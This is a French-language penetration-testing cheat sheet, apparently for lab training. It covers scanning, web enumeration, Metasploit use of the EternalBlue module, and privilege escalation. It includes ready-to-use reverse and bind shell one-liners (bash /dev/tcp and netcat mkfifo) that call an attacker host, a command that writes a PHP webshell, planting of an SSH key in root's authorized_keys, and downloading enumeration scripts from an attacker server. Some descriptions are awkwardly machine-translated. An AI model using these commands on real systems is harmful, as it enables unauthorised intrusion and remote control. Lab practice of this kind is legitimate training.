## Général	
```
sudo openvpn user.ovpn	Se connecter au VPN
```	
```
ifconfig/ip a	Afficher notre adresse IP	
```	
```
netstat -rn	Afficher les réseaux accessibles via le VPN	
```	
```
ssh user@10.10.10.10	Connexion SSH à un serveur distant	
```	
```
ftp 10.129.42.253	FTP vers un serveur distant	
```

## Vim		
```
vim file	vim : ouvrir fileavec vim	
```	
```
esc+i	vim : entrer en insertmode	
```	
```
esc	vim : retour au normalmode	
```	
```
x	vim : Caractère coupé	
```	
```
dw	vim : Couper le mot	
```	
```
dd	vim : Couper la ligne complète	
```	
```
yw	vim : Copier le mot	
```	
```
yy	vim : Copier la ligne complète	
```	
```
p	vim : Coller	
```	
```
:1	vim : Allez à la ligne numéro 1.	
```	
```
:w	vim : Écrire le fichier « ie save »	
```	
```
:q	vim : Quitter	
```	
```
:q!	vim : Quitter sans enregistrer	
```	
```
:wq	vim : Écrire et quitter	
```	

# Tests d'intrusion

### Numérisation du service	
```	
nmap 10.129.42.253	Exécutez nmap sur une adresse IP	
```	
```
nmap -sV -sC -p- 10.129.42.253	Exécutez un script nmap pour analyser une adresse IP.	
```	
```
locate scripts/citrix	Liste des différents scripts nmap disponibles	
```	
```
nmap --script smb-os-discovery.nse -p445 10.10.10.40	Exécuter un script nmap sur une adresse IP	
```	
```
netcat 10.10.10.10 22	Saisir la bannière d'un port ouvert	
```	
```
smbclient -N -L \\\\10.129.42.253	Liste des actions PME	
```	
```
smbclient \\\\10.129.42.253\\users	Se connecter à un partage PME	
```	
```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0	Analyse SNMP sur une adresse IP	
```	
```
onesixtyone -c dict.txt 10.129.42.254	Chaîne secrète SNMP par force brute	
```	

### Énumération Web		
```
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt	Effectuer une analyse de répertoire sur un site web	
```	
```
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt	Effectuer une analyse de sous-domaines sur un site web	
```	
```
curl -IL https://www.inlanefreight.com	Bannière du site Web Grab	
```	
```
whatweb 10.10.10.121	Liste des détails concernant le serveur web/les certificats	
```	
```
curl 10.10.10.121/robots.txt	Liste des répertoires potentiels dansrobots.txt	
```	
```
ctrl+U	Afficher le code source de la page (dans Firefox)	
```
### Exploits publics		
```
searchsploit openssh 7.2	Rechercher les failles de sécurité publiques d'une application web	
```	
```
msfconsole	MSF : Démarrer le framework Metasploit	
```	
```
search exploit eternalblue	MSF : Recherche d’exploits publics dans MSF	
```	
```
use exploit/windows/smb/ms17_010_psexec	MSF : Commencez à utiliser un module MSF	
```	
```
show options	MSF : Afficher les options requises pour un module MSF	
```	
```
set RHOSTS 10.10.10.40	MSF : Définir une valeur pour une option de module MSF	
```	
```
check	MSF : Tester si le serveur cible est vulnérable	
```	
```
exploit	MSF : L’exploitation de la vulnérabilité sur le serveur cible est compromise.	
```	

### Utilisation des shells		
```
nc -lvnp 1234	Démarrer un ncécouteur sur un port local	
```	
```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	Envoyer une invite de commandes inversée depuis le serveur distant	
```	
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f	Une autre commande pour envoyer un shell inversé depuis le serveur distant	
```	
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f	Démarrez un shell bind sur le serveur distant	
```	
```
nc 10.10.10.1 1234	Connectez-vous à un shell bind démarré sur le serveur distant.	
```	
```
python -c 'import pty; pty.spawn("/bin/bash")'	Mise à niveau du shell TTY (1)	
```	
```
ctrl+zpuis stty raw -echopuis fgpuis enterdeux fois	Mise à niveau du shell TTY (2)	
```	
```
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php	Créer un fichier PHP de webshell	
```	
```
curl http://SERVER_IP:PORT/shell.php?cmd=id	Exécuter une commande sur un webshell téléchargé	
```
### Élévation des privilèges		
```
./linpeas.sh	Exécuter linpeasle script pour énumérer les serveurs distants	
```	
```
sudo -l	Liste sudodes privilèges disponibles	
```	
```
sudo -u user /bin/echo Hello World!	Exécutez une commande avecsudo	
```	
```
sudo su -	Passer en mode utilisateur root (si nous y avons accès sudo su)	
```	
```
sudo su user -	Passer à un utilisateur (si nous y avons accès sudo su)	
```	
```
ssh-keygen -f key	Créer une nouvelle clé SSH	
```	
```
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys	Ajouter la clé publique générée à l'utilisateur	
```	
```
ssh root@10.10.10.10 -i key	Connectez-vous au serveur via SSH avec la clé privée générée.	
```
### Transfert de fichiers		
```
python3 -m http.server 8000	Démarrer un serveur web local	
```	
```
wget http://10.10.14.1:8000/linpeas.sh	Télécharger un fichier sur le serveur distant depuis notre machine locale	
```	
```
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh	Télécharger un fichier sur le serveur distant depuis notre machine locale	
```	
```
scp linenum.sh user@remotehost:/tmp/linenum.sh	Transférer un fichier vers le serveur distant scp(nécessite un accès SSH)	
```	
```
base64 shell -w 0	Convertir un fichier enbase64	
```	
```
echo f0VMR...SNIO...InmDwU | base64 -d > shell	Convertir un fichier base64à son format d'origine	
```	
```
md5sum shell	Vérifiez les fichiers md5sumpour vous assurer qu'ils ont été convertis correctement.	
```
